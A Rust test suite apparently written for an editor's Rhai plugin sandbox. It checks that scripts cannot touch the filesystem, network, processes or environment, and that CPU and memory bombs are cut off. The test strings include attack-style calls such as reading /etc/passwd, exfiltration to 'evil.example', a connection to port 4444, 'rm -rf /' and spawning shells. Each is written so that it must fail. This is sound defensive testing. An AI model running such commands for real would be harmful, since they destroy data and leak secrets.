//! Trust-boundary test suite: prove the Rhai plugin host is sandboxed by
//! construction (taxonomy #34 / blueprint PART 2 §B item 5).
//!
//! The plugin host (`scribe_core::plugin::PluginHost`) claims a "sandboxed by
//! construction: no filesystem/network/process access" contract plus a 2-second
//! wall-clock deadline and bounded resource caps. A sandbox escape would mean
//! arbitrary code execution on the user's machine from a dropped-in `.rhai`
//! file, so these assertions are load-bearing.
//!
//! These tests complement (do NOT duplicate) the inline `#[cfg(test)]` tests in
//! `src/plugin/host.rs`. The inline tests cover the happy path + eval/import
//! parse-deny + a single runaway loop + map/expr-depth caps; this suite drives
//! the **adversarial capability matrix** through the PUBLIC API: no
//! network/process/env/time host fns exist, the deadline force-terminates a
//! NON-allocating CPU spin (so `max_operations` is not the only guard), the
//! deadline RE-ARMS per invocation (no escape across calls), and the
//! string/array allocation bombs are bounded.
//!
//! WASM POWER TRACK — HONEST SKIP: `PluginKind::Wasm` is manifest-declared in
//! `plugin/mod.rs`, but there is NO `wasmtime`/WIT host wired in-tree (the
//! source comments say "host not yet live", "as the WASM track lands"). A
//! capability-isolation / fuel-epoch test would have nothing live to exercise,
//! so per `thorough-completion.md` + `test-skip-governance.md` it is honestly
//! omitted here rather than faked. When the wasmtime host lands, the
//! capability-default-deny + fuel/epoch suite belongs alongside this file.

use scribe_core::plugin::{PluginContext, PluginHost};

/// Load a script that registers `cmd`, run it, and return the result. A helper
/// so each adversarial case stays a single readable assertion. The host now
/// surfaces `scribe_core::CoreError` (A-05 plugin error-type normalization) — the
/// adversarial cases below only assert `is_err()`, so the message content is
/// unchanged.
fn run_script(register_src: &str, command_id: &str) -> scribe_core::Result<PluginContext> {
    let mut h = PluginHost::new();
    h.load_script("adversary", register_src)?;
    let mut ctx = PluginContext::new("seed buffer text");
    h.run_command(command_id, &mut ctx)?;
    Ok(ctx)
}

// ---------------------------------------------------------------------------
// CAPABILITY ABSENCE — no ambient filesystem / network / process / env / time.
// A Rhai script can only resolve a host fn that was explicitly registered. The
// host registers ONLY buffer_text/set_buffer_text/notify/log + the two
// registration fns. Any privileged call is therefore an unknown-function error.
// We assert each escape attempt FAILS — proving default-deny by construction.
// ---------------------------------------------------------------------------

/// No filesystem read primitive is reachable from a script.
#[test]
fn no_filesystem_read_capability() {
    for evil in [
        r#"fn go() { let x = open_file("/etc/passwd"); } register_command("go","Go","go");"#,
        r#"fn go() { let x = read_file("C:\\Windows\\win.ini"); } register_command("go","Go","go");"#,
        r#"fn go() { let x = fs::read("secret"); } register_command("go","Go","go");"#,
        r#"fn go() { let x = File::open("x"); } register_command("go","Go","go");"#,
    ] {
        let r = run_script(evil, "go");
        assert!(
            r.is_err(),
            "filesystem-read escape must fail (no such host fn): {evil}"
        );
    }
}

/// No filesystem write primitive is reachable from a script.
#[test]
fn no_filesystem_write_capability() {
    for evil in [
        r#"fn go() { write_file("/tmp/pwn", "x"); } register_command("go","Go","go");"#,
        r#"fn go() { fs::write("/tmp/pwn", "x"); } register_command("go","Go","go");"#,
        r#"fn go() { remove_file("/important"); } register_command("go","Go","go");"#,
    ] {
        assert!(
            run_script(evil, "go").is_err(),
            "filesystem-write escape must fail: {evil}"
        );
    }
}

/// No network primitive is reachable from a script — directly proving the
/// "telemetry-free / no ambient network" plugin contract.
#[test]
fn no_network_capability() {
    for evil in [
        r#"fn go() { let r = http_get("http://evil.example/exfil"); } register_command("go","Go","go");"#,
        r#"fn go() { let r = fetch("http://evil.example"); } register_command("go","Go","go");"#,
        r#"fn go() { let r = tcp_connect("10.0.0.1:4444"); } register_command("go","Go","go");"#,
        r#"fn go() { let r = get("https://evil.example"); } register_command("go","Go","go");"#,
    ] {
        assert!(
            run_script(evil, "go").is_err(),
            "network escape must fail (no such host fn): {evil}"
        );
    }
}

/// No process-spawn primitive is reachable from a script.
#[test]
fn no_process_spawn_capability() {
    for evil in [
        r#"fn go() { spawn("calc.exe"); } register_command("go","Go","go");"#,
        r#"fn go() { Command::new("/bin/sh"); } register_command("go","Go","go");"#,
        r#"fn go() { system("rm -rf /"); } register_command("go","Go","go");"#,
        r#"fn go() { exec("powershell"); } register_command("go","Go","go");"#,
    ] {
        assert!(
            run_script(evil, "go").is_err(),
            "process-spawn escape must fail: {evil}"
        );
    }
}

/// No environment / ambient-host introspection primitive is reachable.
#[test]
fn no_env_or_host_introspection_capability() {
    for evil in [
        r#"fn go() { let h = env("HOME"); } register_command("go","Go","go");"#,
        r#"fn go() { let v = get_env("PATH"); } register_command("go","Go","go");"#,
        r#"fn go() { let t = timestamp(); } register_command("go","Go","go");"#,
        r#"fn go() { print("leak"); } register_command("go","Go","go");"#,
        r#"fn go() { debug("leak"); } register_command("go","Go","go");"#,
    ] {
        assert!(
            run_script(evil, "go").is_err(),
            "env/introspection/print escape must fail (host registers none): {evil}"
        );
    }
}

// ---------------------------------------------------------------------------
// DEADLINE / RESOURCE BOMBS — the wall-clock deadline and the engine caps must
// force-terminate hostile or buggy scripts. These prove TIME and MEMORY are
// both bounded, independently.
// ---------------------------------------------------------------------------

/// A NON-allocating tight CPU loop must still be force-terminated. This proves
/// the wall-clock `PLUGIN_DEADLINE` (or the operation budget) bounds CPU, not
/// merely allocation: a loop that does no allocation cannot be stopped by the
/// memory caps alone, so termination here exercises the time/op guard directly.
/// Runs in well under the 2s deadline because `max_operations` (5e6) trips first
/// for a pure-arithmetic spin — either guard satisfies the "never hangs" claim.
#[test]
fn non_allocating_cpu_spin_is_terminated() {
    let r = run_script(
        r#"fn spin() { let x = 0; loop { x += 1; } } register_command("spin","Spin","spin");"#,
        "spin",
    );
    assert!(
        r.is_err(),
        "a non-allocating infinite CPU loop must be force-terminated, got {r:?}"
    );
}

/// A recursive (call-level) bomb is bounded by `max_call_levels`. Distinct from
/// the loop guard — this exercises the stack-depth cap, so a script cannot blow
/// the host's native stack via unbounded self-recursion.
#[test]
fn unbounded_recursion_is_bounded() {
    let r = run_script(
        r#"fn rec() { rec(); } register_command("rec","Rec","rec");"#,
        "rec",
    );
    assert!(
        r.is_err(),
        "unbounded recursion must hit the call-level cap, got {r:?}"
    );
}

/// A string-concatenation bomb (grow one string toward OOM) is bounded by
/// `max_string_size` (10 MiB) — the engine rejects the operation rather than
/// letting a script exhaust memory.
#[test]
fn string_growth_bomb_is_bounded() {
    let r = run_script(
        r#"
        fn grow() {
            let s = "x";
            loop { s += s; }   // doubles each iteration -> blows past 10 MiB fast
        }
        register_command("grow","Grow","grow");
        "#,
        "grow",
    );
    assert!(
        r.is_err(),
        "string-growth bomb must be rejected by the size cap, got {r:?}"
    );
}

/// An array-growth bomb is bounded by `max_array_size` (1_000_000).
#[test]
fn array_growth_bomb_is_bounded() {
    let r = run_script(
        r#"
        fn grow() {
            let a = [];
            let i = 0;
            while i < 5_000_000 { a.push(i); i += 1; }
            notify("never");
        }
        register_command("grow","Grow","grow");
        "#,
        "grow",
    );
    assert!(
        r.is_err(),
        "array-growth bomb must be rejected by the array-size cap, got {r:?}"
    );
}

// ---------------------------------------------------------------------------
// DEADLINE-ESCAPE REGRESSION — the deadline must RE-ARM for every invocation.
// A naive implementation that arms the deadline once (at load) would let a
// second, slower command run unbounded. We prove a runaway command can be run
// AFTER a benign command on the same host and is STILL terminated — i.e. the
// guard is per-invocation, not one-shot.
// ---------------------------------------------------------------------------

/// Deadline re-arms per `run_command`: a benign command runs fine, then a
/// runaway command on the SAME host is still force-terminated. Guards against a
/// regression where the deadline is armed once and never reset.
#[test]
fn deadline_rearms_per_invocation_no_escape_across_calls() {
    let mut h = PluginHost::new();
    h.load_script(
        "mixed",
        r#"
        fn benign() { set_buffer_text(buffer_text() + "!"); }
        fn spin()   { let x = 0; loop { x += 1; } }
        register_command("benign", "Benign", "benign");
        register_command("spin",   "Spin",   "spin");
        "#,
    )
    .expect("load");

    // First: the benign command completes normally (and the host is usable).
    let mut ctx1 = PluginContext::new("doc");
    h.run_command("benign", &mut ctx1).expect("benign runs");
    assert_eq!(ctx1.text, "doc!");

    // Then: the runaway command on the same host is STILL terminated — proving
    // the deadline/op-guard was re-armed for this second invocation rather than
    // exhausted by the first run.
    let mut ctx2 = PluginContext::new("doc");
    let r = h.run_command("spin", &mut ctx2);
    assert!(
        r.is_err(),
        "the runaway must be terminated on a later invocation too (deadline must re-arm), got {r:?}"
    );

    // And the host survives the termination: a third benign run still works,
    // proving the failure was contained to the one command (no poisoned state).
    let mut ctx3 = PluginContext::new("again");
    h.run_command("benign", &mut ctx3)
        .expect("host still usable after a kill");
    assert_eq!(ctx3.text, "again!");
}

/// A runaway INSIDE a lifecycle hook (fire_event path) is also bounded — the
/// deadline guards the event-dispatch path, not just direct command runs.
#[test]
fn runaway_in_event_hook_is_terminated() {
    use scribe_core::plugin::HookEvent;
    let mut h = PluginHost::new();
    h.load_script(
        "evil-hook",
        r#"
        fn on_save() { let x = 0; loop { x += 1; } }
        on_event("save", "on_save");
        "#,
    )
    .expect("load");
    let mut ctx = PluginContext::new("doc");
    let r = h.fire_event(HookEvent::Save, &mut ctx);
    assert!(
        r.is_err(),
        "a runaway save-hook must be force-terminated, got {r:?}"
    );
}

/// The capability ENUM marks everything except `Buffer` as privileged. This is
/// the manifest-side contract the (future) host-mediated APIs gate on; pin it so
/// a refactor cannot silently flip a privileged capability to unprivileged.
#[test]
fn only_buffer_capability_is_unprivileged() {
    use scribe_core::plugin::Capability;
    assert!(!Capability::Buffer.is_privileged());
    for c in [
        Capability::FilesystemRead,
        Capability::FilesystemWrite,
        Capability::Network,
        Capability::Process,
    ] {
        assert!(
            c.is_privileged(),
            "{c:?} must be privileged (consent-gated); v1 scripts get none of these"
        );
    }
}
